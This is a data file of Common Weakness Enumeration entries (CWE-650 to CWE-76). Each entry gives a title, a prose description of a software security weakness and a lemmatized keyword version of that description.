CWE-650,Trusting HTTP Permission Methods on the Server Side,"The server contains a protection mechanism that assumes that any URI that is accessed using HTTP GET will not cause a state change to the associated resource. This might allow attackers to bypass intended access restrictions and conduct resource modification and deletion attacks, since some applications allow GET to modify state.The HTTP GET method and some other methods are designed to retrieve resources and not to alter the state of the application or resources on the server side. Furthermore, the HTTP specification requires that GET requests (and other requests) should not have side effects. Believing that it will be enough to prevent unintended resource alterations, an application may disallow the HTTP requests to perform DELETE, PUT and POST operations on the resource representation. However, there is nothing in the HTTP protocol itself that actually prevents the HTTP GET method from performing more than just query of the data. Developers can easily code programs that accept a HTTP GET request that do in fact create, update or delete data on the server. For instance, it is a common practice with REST based Web Services to have HTTP GET requests modifying resources on the server side. However, whenever that happens, the access control needs to be properly enforced in the application. No assumptions should be made that only HTTP DELETE, PUT, POST, and other methods have the power to alter the representation of the resource being accessed in the request.",server contain protection mechanism assume uri access http cause state change associate resource allow attacker bypass intended access restriction conduct resource modification deletion attack application allow modify state http method method design retrieve resource alter state application resource server furthermore http specification require request request effect believe prevent unintended resource alteration application disallow http request perform delete post operation resource representation http protocol actually prevent http method perform query datum developer easily code program accept http request fact create update delete datum server instance common practice rest base web service http request modify resource server happen access control need properly enforce application assumption http delete post method power alter representation resource access request
CWE-651,Exposure of WSDL File Containing Sensitive Information,The Web services architecture may require exposing a Web Service Definition Language (WSDL) file that contains information on the publicly accessible services and how callers of these services should interact with them (e.g. what parameters they expect and what types they return).An information exposure may occur if any of the following apply:The WSDL file is accessible to a wider audience than intended.The WSDL file contains information on the methods/services that should not be publicly accessible or information about deprecated methods. This problem is made more likely due to the WSDL often being automatically generated from the code.Information in the WSDL file helps guess names/locations of methods/resources that should not be publicly accessible.,web service architecture require expose web service definition language wsdl file contain information publicly accessible service caller service interact parameter expect type information exposure occur following apply wsdl file accessible wide audience intend wsdl file contain information method service publicly accessible information deprecate method problem likely wsdl automatically generate code information wsdl file help guess name location method resource publicly accessible
CWE-652,Improper Neutralization of Data within XQuery Expressions ('XQuery Injection'),"The product uses external input to dynamically construct an XQuery expression used to retrieve data from an XML database, but it does not neutralize or incorrectly neutralizes that input. This allows an attacker to control the structure of the query.The net effect is that the attacker will have control over the information selected from the XML database and may use that ability to control application flow, modify logic, retrieve unauthorized data, or bypass important checks (e.g. authentication).",product use external input dynamically construct xquery expression retrieve datum xml database neutralize incorrectly neutralize input allow attacker control structure query net effect attacker control information select xml database use ability control application flow modify logic retrieve unauthorized datum bypass important check authentication
CWE-653,Improper Isolation or Compartmentalization,"The product does not properly compartmentalize or isolate functionality, processes, or resources that require different privilege levels, rights, or permissions.When a weakness occurs in functionality that is accessible by lower-privileged users, then without strong boundaries, an attack might extend the scope of the damage to higher-privileged users.",product properly compartmentalize isolate functionality process resource require different privilege level right permission weakness occur functionality accessible lower privileged user strong boundary attack extend scope damage higher privileged user
CWE-654,Reliance on a Single Factor in a Security Decision,"A protection mechanism relies exclusively, or to a large extent, on the evaluation of a single condition or the integrity of a single object or entity in order to make a decision about granting access to restricted resources or functionality.",protection mechanism rely exclusively large extent evaluation single condition integrity single object entity order decision grant access restricted resource functionality
CWE-655,Insufficient Psychological Acceptability,"The product has a protection mechanism that is too difficult or inconvenient to use, encouraging non-malicious users to disable or bypass the mechanism, whether by accident or on purpose.",product protection mechanism difficult inconvenient use encourage non malicious user disable bypass mechanism accident purpose
CWE-656,Reliance on Security Through Obscurity,"The product uses a protection mechanism whose strength depends heavily on its obscurity, such that knowledge of its algorithms or key data is sufficient to defeat the mechanism.This reliance on ""security through obscurity"" can produce resultant weaknesses if an attacker is able to reverse engineer the inner workings of the mechanism. Note that obscurity can be one small part of defense in depth, since it can create more work for an attacker; however, it is a significant risk if used as the primary means of protection.",product use protection mechanism strength depend heavily obscurity knowledge algorithm key datum sufficient defeat mechanism reliance security obscurity produce resultant weakness attacker able reverse engineer inner working mechanism note obscurity small defense depth create work attacker significant risk primary means protection
CWE-657,Violation of Secure Design Principles,"The product violates well-established principles for secure design.This can introduce resultant weaknesses or make it easier for developers to introduce related weaknesses during implementation. Because code is centered around design, it can be resource-intensive to fix design problems.",product violate establish principle secure design introduce resultant weakness easier developer introduce related weakness implementation code center design resource intensive fix design problem
CWE-66,Improper Handling of File Names that Identify Virtual Resources,"The product does not handle or incorrectly handles a file name that identifies a ""virtual"" resource that is not directly specified within the directory that is associated with the file name, causing the product to perform file-based operations on a resource that is not a file.Virtual file names are represented like normal file names, but they are effectively aliases for other resources that do not behave like normal files. Depending on their functionality, they could be alternate entities. They are not necessarily listed in directories.",product handle incorrectly handle file identify virtual resource directly specify directory associate file cause product perform file base operation resource file virtual file name represent like normal file name effectively alias resource behave like normal file depend functionality alternate entity necessarily list directory
CWE-662,Improper Synchronization,"The product utilizes multiple threads or processes to allow temporary access to a shared resource that can only be exclusive to one process at a time, but it does not properly synchronize these actions, which might cause simultaneous accesses of this resource by multiple threads or processes.Synchronization refers to a variety of behaviors and mechanisms that allow two or more independently-operating processes or threads to ensure that they operate on shared resources in predictable ways that do not interfere with each other. Some shared resource operations cannot be executed atomically; that is, multiple steps must be guaranteed to execute sequentially, without any interference by other processes. Synchronization mechanisms vary widely, but they may include locking, mutexes, and semaphores. When a multi-step operation on a shared resource cannot be guaranteed to execute independent of interference, then the resulting behavior can be unpredictable. Improper synchronization could lead to data or memory corruption, denial of service, etc.",product utilize multiple thread process allow temporary access share resource exclusive process time properly synchronize action cause simultaneous access resource multiple thread process synchronization refer variety behavior mechanism allow independently operate process thread ensure operate share resource predictable way interfere shared resource operation execute atomically multiple step guarantee execute sequentially interference process synchronization mechanism vary widely include locking mutexe semaphore multi step operation share resource guarantee execute independent interference result behavior unpredictable improper synchronization lead datum memory corruption denial service etc
CWE-663,Use of a Non-reentrant Function in a Concurrent Context,The product calls a non-reentrant function in a concurrent context in which a competing code sequence (e.g. thread or signal handler) may have an opportunity to call the same function or otherwise influence its state.,product call non reentrant function concurrent context compete code sequence thread signal handler opportunity function influence state
CWE-664,Improper Control of a Resource Through its Lifetime,"The product does not maintain or incorrectly maintains control over a resource throughout its lifetime of creation, use, and release.Resources often have explicit instructions on how to be created, used and destroyed. When code does not follow these instructions, it can lead to unexpected behaviors and potentially exploitable states.Even without explicit instructions, various principles are expected to be adhered to, such as ""Do not use an object until after its creation is complete,"" or ""do not use an object after it has been slated for destruction.""",product maintain incorrectly maintain control resource lifetime creation use release resource explicit instruction create destroy code follow instruction lead unexpected behavior potentially exploitable state explicit instruction principle expect adhere use object creation complete use object slate destruction
CWE-665,Improper Initialization,"The product does not initialize or incorrectly initializes a resource, which might leave the resource in an unexpected state when it is accessed or used.This can have security implications when the associated resource is expected to have certain properties or values, such as a variable that determines whether a user has been authenticated or not.",product initialize incorrectly initialize resource leave resource unexpected state access security implication associate resource expect certain property value variable determine user authenticate
CWE-666,Operation on Resource in Wrong Phase of Lifetime,"The product performs an operation on a resource at the wrong phase of the resource's lifecycle, which can lead to unexpected behaviors.A resource's lifecycle includes several phases: initialization, use, and release. For each phase, it is important to follow the specifications outlined for how to operate on the resource and to ensure that the resource is in the expected phase. Otherwise, if a resource is in one phase but the operation is not valid for that phase (i.e., an incorrect phase of the resource's lifetime), then this can produce resultant weaknesses. For example, using a resource before it has been fully initialized could cause corruption or incorrect data to be used.",product perform operation resource wrong phase resource lifecycle lead unexpected behavior resource lifecycle include phase initialization use release phase important follow specification outline operate resource ensure resource expect phase resource phase operation valid phase incorrect phase resource lifetime produce resultant weakness example resource fully initialize cause corruption incorrect datum
CWE-667,Improper Locking,"The product does not properly acquire or release a lock on a resource, leading to unexpected resource state changes and behaviors.Locking is a type of synchronization behavior that ensures that multiple independently-operating processes or threads do not interfere with each other when accessing the same resource. All processes/threads are expected to follow the same steps for locking. If these steps are not followed precisely - or if no locking is done at all - then another process/thread could modify the shared resource in a way that is not visible or predictable to the original process. This can lead to data or memory corruption, denial of service, etc.",product properly acquire release lock resource lead unexpected resource state change behavior locking type synchronization behavior ensure multiple independently operate process thread interfere access resource process thread expect follow step locking step follow precisely locking process thread modify share resource way visible predictable original process lead datum memory corruption denial service etc
CWE-668,Exposure of Resource to Wrong Sphere,"The product exposes a resource to the wrong control sphere, providing unintended actors with inappropriate access to the resource.Resources such as files and directories may be inadvertently exposed through mechanisms such as insecure permissions, or when a program accidentally operates on the wrong object. For example, a program may intend that private files can only be provided to a specific user. This effectively defines a control sphere that is intended to prevent attackers from accessing these private files. If the file permissions are insecure, then parties other than the user will be able to access those files.A separate control sphere might effectively require that the user can only access the private files, but not any other files on the system. If the program does not ensure that the user is only requesting private files, then the user might be able to access other files on the system.In either case, the end result is that a resource has been exposed to the wrong party.",product expose resource wrong control sphere provide unintended actor inappropriate access resource resource file directory inadvertently expose mechanism insecure permission program accidentally operate wrong object example program intend private file provide specific user effectively define control sphere intend prevent attacker access private file file permission insecure party user able access file separate control sphere effectively require user access private file file system program ensure user request private file user able access file system case end result resource expose wrong party
CWE-669,Incorrect Resource Transfer Between Spheres,"The product does not properly transfer a resource/behavior to another sphere, or improperly imports a resource/behavior from another sphere, in a manner that provides unintended control over that resource.",product properly transfer resource behavior sphere improperly import resource behavior sphere manner provide unintended control resource
CWE-67,Improper Handling of Windows Device Names,"The product constructs pathnames from user input, but it does not handle or incorrectly handles a pathname containing a Windows device name such as AUX or CON. This typically leads to denial of service or an information exposure when the application attempts to process the pathname as a regular file.Not properly handling virtual filenames (e.g. AUX, CON, PRN, COM1, LPT1) can result in different types of vulnerabilities. In some cases an attacker can request a device via injection of a virtual filename in a URL, which may cause an error that leads to a denial of service or an error page that reveals sensitive information. A product that allows device names to bypass filtering runs the risk of an attacker injecting malicious code in a file with the name of a device.",product construct pathname user input handle incorrectly handle pathname contain windows device aux con typically lead denial service information exposure application attempt process pathname regular file properly handle virtual filename aux con prn result different type vulnerability case attacker request device injection virtual filename url cause error lead denial service error page reveal sensitive information product allow device name bypass filtering run risk attacker inject malicious code file device
CWE-670,Always-Incorrect Control Flow Implementation,"The code contains a control flow path that does not reflect the algorithm that the path is intended to implement, leading to incorrect behavior any time this path is navigated.This weakness captures cases in which a particular code segment is always incorrect with respect to the algorithm that it is implementing. For example, if a C programmer intends to include multiple statements in a single block but does not include the enclosing braces (CWE-483), then the logic is always incorrect. This issue is in contrast to most weaknesses in which the code usually behaves correctly, except when it is externally manipulated in malicious ways.",code contain control flow path reflect algorithm path intend implement lead incorrect behavior time path navigate weakness capture case particular code segment incorrect respect algorithm implement example c programmer intend include multiple statement single block include enclose brace logic incorrect issue contrast weakness code usually behave correctly externally manipulate malicious way
CWE-671,Lack of Administrator Control over Security,"The product uses security features in a way that prevents the product's administrator from tailoring security settings to reflect the environment in which the product is being used. This introduces resultant weaknesses or prevents it from operating at a level of security that is desired by the administrator.If the product's administrator does not have the ability to manage security-related decisions at all times, then protecting the product from outside threats - including the product's developer - can become impossible. For example, a hard-coded account name and password cannot be changed by the administrator, thus exposing that product to attacks that the administrator can not prevent.",product use security feature way prevent product administrator tailor security setting reflect environment product introduce resultant weakness prevent operate level security desire administrator product administrator ability manage security relate decision time protect product outside threat include product developer impossible example hard code account password change administrator expose product attack administrator prevent
CWE-672,Operation on a Resource after Expiration or Release,"The product uses, accesses, or otherwise operates on a resource after that resource has been expired, released, or revoked.",product use access operate resource resource expire release revoke
CWE-673,External Influence of Sphere Definition,"The product does not prevent the definition of control spheres from external actors.Typically, a product defines its control sphere within the code itself, or through configuration by the product's administrator. In some cases, an external party can change the definition of the control sphere. This is typically a resultant weakness.",product prevent definition control sphere external actor typically product define control sphere code configuration product administrator case external party change definition control sphere typically resultant weakness
CWE-674,Uncontrolled Recursion,"The product does not properly control the amount of recursion that takes place, consuming excessive resources, such as allocated memory or the program stack.",product properly control recursion take place consume excessive resource allocate memory program stack
CWE-675,Multiple Operations on Resource in Single-Operation Context,"The product performs the same operation on a resource two or more times, when the operation should only be applied once.",product perform operation resource time operation apply
CWE-676,Use of Potentially Dangerous Function,"The product invokes a potentially dangerous function that could introduce a vulnerability if it is used incorrectly, but the function can also be used safely.",product invoke potentially dangerous function introduce vulnerability incorrectly function safely
CWE-680,Integer Overflow to Buffer Overflow,"The product performs a calculation to determine how much memory to allocate, but an integer overflow can occur that causes less memory to be allocated than expected, leading to a buffer overflow.",product perform calculation determine memory allocate integer overflow occur cause memory allocate expect lead buffer overflow
CWE-681,Incorrect Conversion between Numeric Types,"When converting from one data type to another, such as long to integer, data can be omitted or translated in a way that produces unexpected values. If the resulting values are used in a sensitive context, then dangerous behaviors may occur.",convert data type long integer datum omit translate way produce unexpected value result value sensitive context dangerous behavior occur
CWE-682,Incorrect Calculation,"The product performs a calculation that generates incorrect or unintended results that are later used in security-critical decisions or resource management.When product performs a security-critical calculation incorrectly, it might lead to incorrect resource allocations, incorrect privilege assignments, or failed comparisons among other things. Many of the direct results of an incorrect calculation can lead to even larger problems such as failed protection mechanisms or even arbitrary code execution.",product perform calculation generate incorrect unintended result later security critical decision resource management product perform security critical calculation incorrectly lead incorrect resource allocation incorrect privilege assignment fail comparison thing direct result incorrect calculation lead large problem fail protection mechanism arbitrary code execution
CWE-683,Function Call With Incorrect Order of Arguments,"The product calls a function, procedure, or routine, but the caller specifies the arguments in an incorrect order, leading to resultant weaknesses.While this weakness might be caught by the compiler in some languages, it can occur more frequently in cases in which the called function accepts variable numbers or types of arguments, such as format strings in C. It also can occur in languages or environments that do not enforce strong typing.",product call function procedure routine caller specify argument incorrect order lead resultant weakness weakness catch compiler language occur frequently case call function accept variable number type argument format string occur language environment enforce strong typing
CWE-684,Incorrect Provision of Specified Functionality,"The code does not function according to its published specifications, potentially leading to incorrect usage.When providing functionality to an external party, it is important that the product behaves in accordance with the details specified. When requirements of nuances are not documented, the functionality may produce unintended behaviors for the caller, possibly leading to an exploitable state.",code function accord publish specification potentially lead incorrect usage provide functionality external party important product behave accordance detail specify requirement nuance document functionality produce unintended behavior caller possibly lead exploitable state
CWE-685,Function Call With Incorrect Number of Arguments,"The product calls a function, procedure, or routine, but the caller specifies too many arguments, or too few arguments, which may lead to undefined behavior and resultant weaknesses.",product call function procedure routine caller specify argument argument lead undefined behavior resultant weakness
CWE-686,Function Call With Incorrect Argument Type,"The product calls a function, procedure, or routine, but the caller specifies an argument that is the wrong data type, which may lead to resultant weaknesses.This weakness is most likely to occur in loosely typed languages, or in strongly typed languages in which the types of variable arguments cannot be enforced at compilation time, or where there is implicit casting.",product call function procedure routine caller specify argument wrong data type lead resultant weakness weakness likely occur loosely type language strongly type language type variable argument enforce compilation time implicit casting
CWE-687,Function Call With Incorrectly Specified Argument Value,"The product calls a function, procedure, or routine, but the caller specifies an argument that contains the wrong value, which may lead to resultant weaknesses.",product call function procedure routine caller specify argument contain wrong value lead resultant weakness
CWE-688,Function Call With Incorrect Variable or Reference as Argument,"The product calls a function, procedure, or routine, but the caller specifies the wrong variable or reference as one of the arguments, which may lead to undefined behavior and resultant weaknesses.",product call function procedure routine caller specify wrong variable reference argument lead undefined behavior resultant weakness
CWE-689,Permission Race Condition During Resource Copy,"The product, while copying or cloning a resource, does not set the resource's permissions or access control until the copy is complete, leaving the resource exposed to other spheres while the copy is taking place.",product copy clone resource set resource permission access control copy complete leave resource expose sphere copy take place
CWE-69,Improper Handling of Windows ::DATA Alternate Data Stream,"The product does not properly prevent access to, or detect usage of, alternate data streams (ADS).An attacker can use an ADS to hide information about a file (e.g. size, the name of the process) from a system or file browser tools such as Windows Explorer and 'dir' at the command line utility. Alternately, the attacker might be able to bypass intended access restrictions for the associated data fork.",product properly prevent access detect usage alternate data stream attacker use ads hide information file size process system file browser tool windows explorer dir command line utility alternately attacker able bypass intended access restriction associate datum fork
CWE-690,Unchecked Return Value to NULL Pointer Dereference,"The product does not check for an error after calling a function that can return with a NULL pointer if the function fails, which leads to a resultant NULL pointer dereference.While unchecked return value weaknesses are not limited to returns of NULL pointers (see the examples in CWE-252), functions often return NULL to indicate an error status. When this error condition is not checked, a NULL pointer dereference can occur.",product check error call function return null pointer function fail lead resultant null pointer dereference unchecked return value weakness limit return null pointer example function return null indicate error status error condition check null pointer dereference occur
CWE-691,Insufficient Control Flow Management,"The code does not sufficiently manage its control flow during execution, creating conditions in which the control flow can be modified in unexpected ways.",code sufficiently manage control flow execution create condition control flow modify unexpected way
CWE-692,Incomplete Denylist to Cross-Site Scripting,"The product uses a denylist-based protection mechanism to defend against XSS attacks, but the denylist is incomplete, allowing XSS variants to succeed.While XSS might seem simple to prevent, web browsers vary so widely in how they parse web pages, that a denylist cannot keep track of all the variations. The ""XSS Cheat Sheet"" [REF-714] contains a large number of attacks that are intended to bypass incomplete denylists.",product use denylist base protection mechanism defend xss attack denylist incomplete allow xss variant succeed xss simple prevent web browser vary widely parse web page denylist track variation xss cheat sheet contain large number attack intend bypass incomplete denylist
CWE-693,Protection Mechanism Failure,"The product does not use or incorrectly uses a protection mechanism that provides sufficient defense against directed attacks against the product.This weakness covers three distinct situations. A ""missing"" protection mechanism occurs when the application does not define any mechanism against a certain class of attack. An ""insufficient"" protection mechanism might provide some defenses - for example, against the most common attacks - but it does not protect against everything that is intended. Finally, an ""ignored"" mechanism occurs when a mechanism is available and in active use within the product, but the developer has not applied it in some code path.",product use incorrectly use protection mechanism provide sufficient defense direct attack product weakness cover distinct situation miss protection mechanism occur application define mechanism certain class attack insufficient protection mechanism provide defense example common attack protect intend finally ignored mechanism occur mechanism available active use product developer apply code path
CWE-694,Use of Multiple Resources with Duplicate Identifier,"The product uses multiple resources that can have the same identifier, in a context in which unique identifiers are required.If the product assumes that each resource has a unique identifier, the product could operate on the wrong resource if attackers can cause multiple resources to be associated with the same identifier.",product use multiple resource identifier context unique identifier require product assume resource unique identifier product operate wrong resource attacker cause multiple resource associate identifier
CWE-695,Use of Low-Level Functionality,"The product uses low-level functionality that is explicitly prohibited by the framework or specification under which the product is supposed to operate.The use of low-level functionality can violate the specification in unexpected ways that effectively disable built-in protection mechanisms, introduce exploitable inconsistencies, or otherwise expose the functionality to attack.",product use low level functionality explicitly prohibit framework specification product suppose operate use low level functionality violate specification unexpected way effectively disable build protection mechanism introduce exploitable inconsistency expose functionality attack
CWE-696,Incorrect Behavior Order,"The product performs multiple related behaviors, but the behaviors are performed in the wrong order in ways which may produce resultant weaknesses.",product perform multiple related behavior behavior perform wrong order way produce resultant weakness
CWE-697,Incorrect Comparison,"The product compares two entities in a security-relevant context, but the comparison is incorrect, which may lead to resultant weaknesses.This Pillar covers several possibilities:the comparison checks one factor incorrectly;the comparison should consider multiple factors, but it does not check at least one of those factors at all;the comparison checks the wrong factor.",product compare entity security relevant context comparison incorrect lead resultant weakness pillar cover possibility comparison check factor comparison consider multiple factor check factor comparison check wrong factor
CWE-698,Execution After Redirect (EAR),"The web application sends a redirect to another location, but instead of exiting, it executes additional code.",web application send redirect location instead exit execute additional code
CWE-7,J2EE Misconfiguration: Missing Custom Error Page,"The default error page of a web application should not display sensitive information about the product.A Web application must define a default error page for 4xx errors (e.g. 404), 5xx (e.g. 500) errors and catch java.lang.Throwable exceptions to prevent attackers from mining information from the application container's built-in error response.When an attacker explores a web site looking for vulnerabilities, the amount of information that the site provides is crucial to the eventual success or failure of any attempted attacks.",default error page web application display sensitive information product web application define default error page error error catch throwable exception prevent attacker mine information application container build error response attacker explore web site look vulnerability information site provide crucial eventual success failure attempt attack
CWE-703,Improper Check or Handling of Exceptional Conditions,The product does not properly anticipate or handle exceptional conditions that rarely occur during normal operation of the product.,product properly anticipate handle exceptional condition rarely occur normal operation product
CWE-704,Incorrect Type Conversion or Cast,"The product does not correctly convert an object, resource, or structure from one type to a different type.",product correctly convert object resource structure type different type
CWE-705,Incorrect Control Flow Scoping,The product does not properly return control flow to the proper location after it has completed a task or detected an unusual condition.,product properly return control flow proper location complete task detect unusual condition
CWE-706,Use of Incorrectly-Resolved Name or Reference,"The product uses a name or reference to access a resource, but the name/reference resolves to a resource that is outside of the intended control sphere.",product use reference access resource reference resolve resource outside intended control sphere
CWE-707,Improper Neutralization,"The product does not ensure or incorrectly ensures that structured messages or data are well-formed and that certain security properties are met before being read from an upstream component or sent to a downstream component.If a message is malformed, it may cause the message to be incorrectly interpreted.Neutralization is an abstract term for any technique that ensures that input (and output) conforms with expectations and is ""safe."" This can be done by:checking that the input/output is already ""safe"" (e.g. validation)transformation of the input/output to be ""safe"" using techniques such as filtering, encoding/decoding, escaping/unescaping, quoting/unquoting, or canonicalizationpreventing the input/output from being directly provided by an attacker (e.g. ""indirect selection"" that maps externally-provided values to internally-controlled values)preventing the input/output from being processed at allThis weakness typically applies in cases where the product prepares a control message that another process must act on, such as a command or query, and malicious input that was intended as data, can enter the control plane instead. However, this weakness also applies to more general cases where there are not always control implications.",product ensure incorrectly ensure structure message datum form certain security property meet read upstream component send downstream component message malforme cause message incorrectly interpret neutralization abstract term technique ensure input output conform expectation safe check input output safe input output safe technique filtering encoding decoding escaping unescaping quoting unquoting canonicalizationprevente input output directly provide attacker indirect selection map externally provide value internally control input output process allthis weakness typically apply case product prepare control message process act command query malicious input intend datum enter control plane instead weakness apply general case control implication
CWE-708,Incorrect Ownership Assignment,"The product assigns an owner to a resource, but the owner is outside of the intended control sphere.This may allow the resource to be manipulated by actors outside of the intended control sphere.",product assign owner resource owner outside intended control sphere allow resource manipulate actor outside intended control sphere
CWE-71,DEPRECATED: Apple '.DS_Store',This entry has been deprecated as it represents a specific observed example of a UNIX Hard Link weakness type rather than its own individual weakness type. Please refer to CWE-62.,entry deprecate represent specific observed example unix hard link weakness type individual weakness type refer
CWE-710,Improper Adherence to Coding Standards,"The product does not follow certain coding rules for development, which can lead to resultant weaknesses or increase the severity of the associated vulnerabilities.",product follow certain code rule development lead resultant weakness increase severity associate vulnerability
CWE-72,Improper Handling of Apple HFS+ Alternate Data Stream Path,"The product does not properly handle special paths that may identify the data or resource fork of a file on the HFS+ file system.If the product chooses actions to take based on the file name, then if an attacker provides the data or resource fork, the product may take unexpected actions. Further, if the product intends to restrict access to a file, then an attacker might still be able to bypass intended access restrictions by requesting the data or resource fork for that file.",product properly handle special path identify datum resource fork file file system product choose action base file attacker provide data resource fork product unexpected action product intend restrict access file attacker able bypass intended access restriction request datum resource fork file
CWE-73,External Control of File Name or Path,"The product allows user input to control or influence paths or file names that are used in filesystem operations.This could allow an attacker to access or modify system files or other files that are critical to the application.Path manipulation errors occur when the following two conditions are met:1. An attacker can specify a path used in an operation on the filesystem.2. By specifying the resource, the attacker gains a capability that would not otherwise be permitted.For example, the program may give the attacker the ability to overwrite the specified file or run with a configuration controlled by the attacker.",product allow user input control influence path file name filesystem operation allow attacker access modify system file file critical application path manipulation error occur follow condition attacker specify path operation specify resource attacker gain capability permit example program attacker ability overwrite specify file run configuration control attacker
CWE-732,Incorrect Permission Assignment for Critical Resource,"The product specifies permissions for a security-critical resource in a way that allows that resource to be read or modified by unintended actors.When a resource is given a permission setting that provides access to a wider range of actors than required, it could lead to the exposure of sensitive information, or the modification of that resource by unintended parties. This is especially dangerous when the resource is related to program configuration, execution, or sensitive user data. For example, consider a misconfigured storage account for the cloud that can be read or written by a public or anonymous user.",product specify permission security critical resource way allow resource read modify unintended actor resource give permission setting provide access wide range actor require lead exposure sensitive information modification resource unintended party especially dangerous resource relate program configuration execution sensitive user datum example consider misconfigured storage account cloud read write public anonymous user
CWE-733,Compiler Optimization Removal or Modification of Security-critical Code,"The developer builds a security-critical protection mechanism into the software, but the compiler optimizes the program such that the mechanism is removed or modified.",developer build security critical protection mechanism software compiler optimize program mechanism remove modify
CWE-74,Improper Neutralization of Special Elements in Output Used by a Downstream Component ('Injection'),"The product constructs all or part of a command, data structure, or record using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify how it is parsed or interpreted when it is sent to a downstream component.Software or other automated logic has certain assumptions about what constitutes data and control respectively. It is the lack of verification of these assumptions for user-controlled input that leads to injection problems. Injection problems encompass a wide variety of issues -- all mitigated in very different ways and usually attempted in order to alter the control flow of the process. For this reason, the most effective way to discuss these weaknesses is to note the distinct features that classify them as injection weaknesses. The most important issue to note is that all injection problems share one thing in common -- i.e., they allow for the injection of control plane data into the user-controlled data plane. This means that the execution of the process may be altered by sending code in through legitimate data channels, using no other mechanism. While buffer overflows, and many other flaws, involve the use of some further issue to gain execution, injection problems need only for the data to be parsed.",product construct command data structure record externally influence input upstream component neutralize incorrectly neutralize special element modify parse interpret send downstream component software automated logic certain assumption constitute datum control respectively lack verification assumption user control input lead injection problem injection problem encompass wide variety issue mitigate different way usually attempt order alter control flow process reason effective way discuss weakness note distinct feature classify injection weakness important issue note injection problem share thing common allow injection control plane datum user control data plane mean execution process alter send code legitimate datum channel mechanism buffer overflow flaw involve use issue gain execution injection problem need datum parse
CWE-749,Exposed Dangerous Method or Function,"The product provides an Applications Programming Interface (API) or similar interface for interaction with external actors, but the interface includes a dangerous method or function that is not properly restricted.This weakness can lead to a wide variety of resultant weaknesses, depending on the behavior of the exposed method. It can apply to any number of technologies and approaches, such as ActiveX controls, Java functions, IOCTLs, and so on.The exposure can occur in a few different ways:The function/method was never intended to be exposed to outside actors.The function/method was only intended to be accessible to a limited set of actors, such as Internet-based access from a single web site.",product provide applications programming interface api similar interface interaction external actor interface include dangerous method function properly restrict weakness lead wide variety resultant weakness depend behavior expose method apply number technology approach activex control java function ioctl exposure occur different way function method intend expose outside actor function method intend accessible limited set actor internet base access single web site
CWE-75,Failure to Sanitize Special Elements into a Different Plane (Special Element Injection),The product does not adequately filter user-controlled input for special elements with control implications.,product adequately filter user control input special element control implication
CWE-754,Improper Check for Unusual or Exceptional Conditions,"The product does not check or incorrectly checks for unusual or exceptional conditions that are not expected to occur frequently during day to day operation of the product.The programmer may assume that certain events or conditions will never occur or do not need to be worried about, such as low memory conditions, lack of access to resources due to restrictive permissions, or misbehaving clients or components. However, attackers may intentionally trigger these unusual conditions, thus violating the programmer's assumptions, possibly introducing instability, incorrect behavior, or a vulnerability.Note that this entry is not exclusively about the use of exceptions and exception handling, which are mechanisms for both checking and handling unusual or unexpected conditions.",product check incorrectly check unusual exceptional condition expect occur frequently day day operation product programmer assume certain event condition occur need worry low memory condition lack access resource restrictive permission misbehave client component attacker intentionally trigger unusual condition violate programmer assumption possibly introduce instability incorrect behavior vulnerability note entry exclusively use exception exception handling mechanism check handle unusual unexpected condition
CWE-755,Improper Handling of Exceptional Conditions,The product does not handle or incorrectly handles an exceptional condition.,product handle incorrectly handle exceptional condition
CWE-756,Missing Custom Error Page,"The product does not return custom error pages to the user, possibly exposing sensitive information.",product return custom error page user possibly expose sensitive information
CWE-757,Selection of Less-Secure Algorithm During Negotiation ('Algorithm Downgrade'),"A protocol or its implementation supports interaction between multiple actors and allows those actors to negotiate which algorithm should be used as a protection mechanism such as encryption or authentication, but it does not select the strongest algorithm that is available to both parties.When a security mechanism can be forced to downgrade to use a less secure algorithm, this can make it easier for attackers to compromise the product by exploiting weaker algorithm. The victim might not be aware that the less secure algorithm is being used. For example, if an attacker can force a communications channel to use cleartext instead of strongly-encrypted data, then the attacker could read the channel by sniffing, instead of going through extra effort of trying to decrypt the data using brute force techniques.",protocol implementation support interaction multiple actor allow actor negotiate algorithm protection mechanism encryption authentication select strong algorithm available party security mechanism force downgrade use secure algorithm easy attacker compromise product exploit weak algorithm victim aware secure algorithm example attacker force communication channel use cleartext instead strongly encrypt datum attacker read channel sniff instead go extra effort try decrypt datum brute force technique
CWE-758,"Reliance on Undefined, Unspecified, or Implementation-Defined Behavior","The product uses an API function, data structure, or other entity in a way that relies on properties that are not always guaranteed to hold for that entity.This can lead to resultant weaknesses when the required properties change, such as when the product is ported to a different platform or if an interaction error (CWE-435) occurs.",product use api function data structure entity way rely property guarantee hold entity lead resultant weakness require property change product port different platform interaction error occur
CWE-759,Use of a One-Way Hash without a Salt,"The product uses a one-way cryptographic hash against an input that should not be reversible, such as a password, but the product does not also use a salt as part of the input.This makes it easier for attackers to pre-compute the hash value using dictionary attack techniques such as rainbow tables.It should be noted that, despite common perceptions, the use of a good salt with a hash does not sufficiently increase the effort for an attacker who is targeting an individual password, or who has a large amount of computing resources available, such as with cloud-based services or specialized, inexpensive hardware. Offline password cracking can still be effective if the hash function is not expensive to compute; many cryptographic functions are designed to be efficient and can be vulnerable to attacks using massive computing resources, even if the hash is cryptographically strong. The use of a salt only slightly increases the computing requirements for an attacker compared to other strategies such as adaptive hash functions. See CWE-916 for more details.",product use way cryptographic hash input reversible password product use salt input make easy attacker pre compute hash value dictionary attack technique rainbow table note despite common perception use good salt hash sufficiently increase effort attacker target individual password large computing resource available cloud base service specialized inexpensive hardware offline password cracking effective hash function expensive compute cryptographic function design efficient vulnerable attack massive compute resource hash cryptographically strong use salt slightly increase computing requirement attacker compare strategy adaptive hash function detail
CWE-76,Improper Neutralization of Equivalent Special Elements,"The product correctly neutralizes certain special elements, but it improperly neutralizes equivalent special elements.The product may have a fixed list of special characters it believes is complete. However, there may be alternate encodings, or representations that also have the same meaning. For example, the product may filter out a leading slash (/) to prevent absolute path names, but does not account for a tilde (~) followed by a user name, which on some *nix systems could be expanded to an absolute pathname. Alternately, the product might filter a dangerous ""-e"" command-line switch when calling an external program, but it might not account for ""--exec"" or other switches that have the same semantics.",product correctly neutralize certain special element improperly neutralize equivalent special element product fix list special character believe complete alternate encoding representation meaning example product filter lead slash prevent absolute path name account tilde follow user nix system expand absolute pathname alternately product filter dangerous command line switch call external program account switch semantic
